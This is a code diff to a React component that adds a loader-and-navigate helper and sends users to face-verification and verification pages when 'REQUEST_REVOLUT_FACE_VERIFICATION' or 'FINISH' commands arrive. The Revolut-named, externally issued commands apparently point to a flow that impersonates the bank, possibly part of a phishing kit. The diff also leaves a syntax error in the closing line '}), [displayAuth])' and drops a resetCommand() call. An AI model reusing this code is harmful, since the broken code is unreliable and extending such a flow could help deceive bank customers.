@@ -19,19 +19,47 @@ export default function MobileAuthModal({ displayAuth, resetCommand ,setDisplayA
         setDisplayLoader(!displayLoader)
     }
 
+    const navigateWithLoader = (path) => {
+      // Show loader
+      setDisplayLoader(true);
+      
+      // Set a minimum display time for the loader (for UX purposes)
+      const minLoaderTime = 1500; // 1.5 seconds
+      const startTime = Date.now();
+      
+      // Prepare the navigation
+      const performNavigation = () => {
+        router.push(path);
+      };
+      
+      // Handle the timing
+      setTimeout(() => {
+        const elapsedTime = Date.now() - startTime;
+        if (elapsedTime < minLoaderTime) {
+          // If minimum time hasn't passed, wait the remaining time
+          setTimeout(performNavigation, minLoaderTime - elapsedTime);
+        } else {
+          // Minimum time has passed, navigate immediately
+          performNavigation();
+        }
+      }, 100); // Small delay to ensure loader is visible
+    };
+
      useEffect(() => {
         if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION') {
-            displayPageLoader();
-            setTimeout(() => {
-                console.log("HERE WE WILL PUSH TO FACE VERIFICATION PAGE");
-                router.push('/FaceVerificationPage');
-            }, 3500);
+            navigateWithLoader('/FaceVerificationPage');
+            // displayPageLoader();
+            // setTimeout(() => {
+            //     console.log("HERE WE WILL PUSH TO FACE VERIFICATION PAGE");
+            //     router.push('/FaceVerificationPage');
+            // }, 3500);
         } else if (command === 'FINISH') {
-            displayPageLoader();
-            setTimeout(() => {
-                resetCommand(); 
-                router.push('/verificationPage');
-            }, 1500);
+            navigateWithLoader('/verificationPage');
+            // displayPageLoader();
+            // setTimeout(() => {
+            //     resetCommand(); 
+            //     router.push('/verificationPage');
+            // }, 1500);
         } 
     }, [command, router]);
 
@@ -47,7 +75,7 @@ export default function MobileAuthModal({ displayAuth, resetCommand ,setDisplayA
         } else {
             onMountEffect()
         }
-    })
+    }), [displayAuth]) 
 
     // this function onmount the whole component with transition still intact
     const onMountEffect = () => {
